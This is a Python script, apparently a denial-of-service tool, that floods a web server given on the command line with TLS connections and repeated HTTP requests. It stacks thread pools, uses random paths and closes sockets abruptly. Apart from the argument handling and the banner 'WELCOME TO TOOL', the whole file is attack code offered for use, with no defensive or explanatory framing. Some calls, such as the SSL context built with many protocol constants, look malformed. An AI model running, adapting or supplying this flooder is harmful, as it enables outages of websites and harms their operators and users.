import threading,socket,ssl,random,string,struct,os,sys
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

def generate_url_path(num=1):
    thai_chars = "กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรลวศษสหฬอฮ๐๑๒๓๔๕๖๗๘๙"
    char_set = string.ascii_letters + string.digits + string.punctuation + thai_chars
    return "".join(random.choices(char_set, k=num))

def get_target(url2):
    parsed_url = urlparse(url2.rstrip())
    
    return {
        'uri': parsed_url.path or '/',
        'host': parsed_url.netloc,
        'scheme': parsed_url.scheme,
        'port': parsed_url.port or ('443' if parsed_url.scheme == 'https' else '80'),
        'normal': url2
    }

def Rapid_sender(target,s,byt):
    try:
     for _ in range(500):
      s.write(byt[0]); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
      s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1)); s.write(byt[1])
     s.shutdown(socket.SHUT_RDWR)
     s.close()
    except:pass
def Rapid(target,meth):
  try:
    for _ in range(500):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
     s.connect((target['host'],int(target['port']))); s.connect_ex((target['host'],int(target['port'])))
     threading.Thread(target=Rapid_sender,args=(target,ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23).wrap_socket(s,server_hostname=target['host']),[f"{meth} {a} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()for a in ['/'+generate_url_path(num=1),target['uri']]])).start()
  except:pass

def fast_thread_pool(target,meth,n_threads):
    with ThreadPoolExecutor(max_workers=n_threads) as executor:list(executor.submit(Rapid, target,meth) for i in range(n_threads))

url,thread,meth = '',0,''

try:
   url, thread, meth = sys.argv[1], int(sys.argv[2]), sys.argv[3]
   target = get_target(url)
except (IndexError, ValueError):print("WELCOME TO TOOL")
for _ in range(thread):
   with ThreadPoolExecutor(max_workers=10) as executor:
        list(executor.submit(fast_thread_pool, target,meth,thread) for i in range(10))